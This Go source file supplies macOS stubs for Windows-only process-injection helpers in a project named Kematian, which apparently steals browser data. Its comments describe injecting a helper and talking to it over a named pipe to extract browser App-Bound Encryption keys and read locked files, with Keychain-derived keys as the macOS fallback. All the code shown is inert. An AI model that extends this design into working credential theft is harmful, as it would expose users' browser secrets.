//go:build darwin

// pipe_stub.go — macOS stubs for Windows-only process-injection helpers.
//
// On Windows, Kematian can talk to an injected helper over a named pipe to
// extract App-Bound Encryption (v20) keys or read locked files. macOS has no
// equivalent path; methods return "not supported" and callers fall back to
// Keychain-derived keys and standard file reads.
package platform

import (
	"errors"
)

// PipeSession is a no-op on darwin (Windows injection channel placeholder).
type PipeSession struct{}

var ActivePipeSession *PipeSession

func (s *PipeSession) Close() {}

func (s *PipeSession) GetV20Key(browserName string, encKeyBase64 string) ([]byte, error) {
	return nil, errors.New("not supported")
}

func (s *PipeSession) ReadFile(path string) ([]byte, error) {
	return nil, errors.New("not supported")
}
